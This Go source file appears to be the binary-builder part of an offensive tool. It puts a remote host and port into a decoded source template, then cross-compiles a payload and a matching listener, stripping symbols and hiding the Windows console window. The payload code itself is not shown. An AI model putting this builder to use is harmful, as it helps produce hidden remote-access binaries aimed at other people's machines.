package binmaker

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

type UserOptions struct {
	AppType           string
	TargetOS          string
	TargetArch        string
	Rhost             string
	Rport             string
	TargetBinaryPath  string
	SaveAs            string
	SourceCodePath    string
	DecodedSourceCode string
	UpdatedSourceCode string
}

type IBinaryBuilder interface {
	SourceToBinary(finflag chan string, exepath, gofilepath string)
	GetUpdateSourceCode() string
	ClearAllSource()
	CreateSourceFile()
}

func checkerror(err error) {
	if err != nil {
		fmt.Println(err)
		//return
	}
}

func (oUserOptions *UserOptions) UpdateSourceCode(isListener bool) {
	oUserOptions.UpdatedSourceCode = strings.Replace(oUserOptions.DecodedSourceCode, "RHOST", oUserOptions.Rhost, 1)
	oUserOptions.UpdatedSourceCode = strings.Replace(oUserOptions.UpdatedSourceCode, "RPORT", oUserOptions.Rport, 1)
	if !isListener {
		oUserOptions.SourceCodePath = `out` + string(os.PathSeparator) + `udptest.go`
		if oUserOptions.TargetOS == "windows" {
			oUserOptions.TargetBinaryPath = `out` + string(os.PathSeparator) + oUserOptions.SaveAs + ".exe"
		} else {
			oUserOptions.TargetBinaryPath = `out` + string(os.PathSeparator) + oUserOptions.SaveAs
		}
	} else {
		//oUserOptions.UpdatedSourceCode = strings.Replace(oUserOptions.DecodedSourceCode, "LPORT", oUserOptions.Rport, 1)
		oUserOptions.SourceCodePath = `out` + string(os.PathSeparator) + `udptestlistener.go`
		if oUserOptions.TargetOS == "windows" {
			oUserOptions.TargetBinaryPath = `out` + string(os.PathSeparator) + oUserOptions.SaveAs + "listener.exe"
		} else {
			oUserOptions.TargetBinaryPath = `out` + string(os.PathSeparator) + oUserOptions.SaveAs + "listener"
		}
	}
}
func (oUserOptions *UserOptions) CreateSourceFile() {
	newFile, err := os.Create(oUserOptions.SourceCodePath)
	checkerror(err)
	newFile.WriteString(oUserOptions.UpdatedSourceCode)
	newFile.Close()
}
func (oUserOptions *UserOptions) SourceToBinary(finflag chan string) {
	binpath := oUserOptions.TargetBinaryPath + " " + oUserOptions.SourceCodePath
	if runtime.GOOS == "linux" {
		fmt.Println("building linux binary.....")
		cmdpath, _ := exec.LookPath("bash")
		var execargs string
		if strings.ToLower(oUserOptions.AppType) == "console" {
			execargs = "GOOS=" + oUserOptions.TargetOS + " GOARCH=" + oUserOptions.TargetArch + ` go build -ldflags="-s -w" -buildmode=exe -o ` + binpath
		} else {
			execargs = "GOOS=" + oUserOptions.TargetOS + " GOARCH=" + oUserOptions.TargetArch + ` go build -ldflags="-s -w" -buildmode=exe -H=windowsgui -o ` + binpath
		}
		cmd := exec.Command(cmdpath, "-c", execargs)
		res, err := cmd.CombinedOutput()
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println(oUserOptions.TargetBinaryPath)
			fmt.Println(" :Build Success !")
		}
		fmt.Println(string(res))
	} else {
		fmt.Println("building windows exe.....")
		buildpath := `out` + string(os.PathSeparator) + `build.bat`
		buildbat, err := os.Create(buildpath)
		if err != nil {
			log.Fatal(err)
		}
		fmt.Println(buildpath)
		buildbat.WriteString("SET GOOS=" + oUserOptions.TargetOS + "\n")
		buildbat.WriteString("SET GOARCH=" + oUserOptions.TargetArch + "\n")
		if strings.ToLower(oUserOptions.AppType) == "console" {
			buildbat.WriteString(`go build -o -ldflags="-s -w" -buildmode=exe -o ` + binpath)
		} else {
			buildbat.WriteString(`go build -ldflags="-s -w" -buildmode=exe -H=windowsgui -o ` + binpath)
		}
		buildbat.Close()

		err = exec.Command(buildpath).Run()
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println(oUserOptions.TargetBinaryPath)
			fmt.Println(" :Build Success !")
		}
	}
	finflag <- "Build Success"
}

func (oUserOptions *UserOptions) ClearAllSource() {
	gofiles, err := filepath.Glob("out/*.go")
	if err != nil {
		fmt.Println(err)
	}
	for _, f := range gofiles {
		if err := os.Remove(f); err != nil {
			fmt.Println(err)
		}
	}

	batfiles, err := filepath.Glob("out/*.bat")
	if err != nil {
		fmt.Println(err)
	}
	for _, f := range batfiles {
		if err := os.Remove(f); err != nil {
			fmt.Println(err)
		}
	}
}
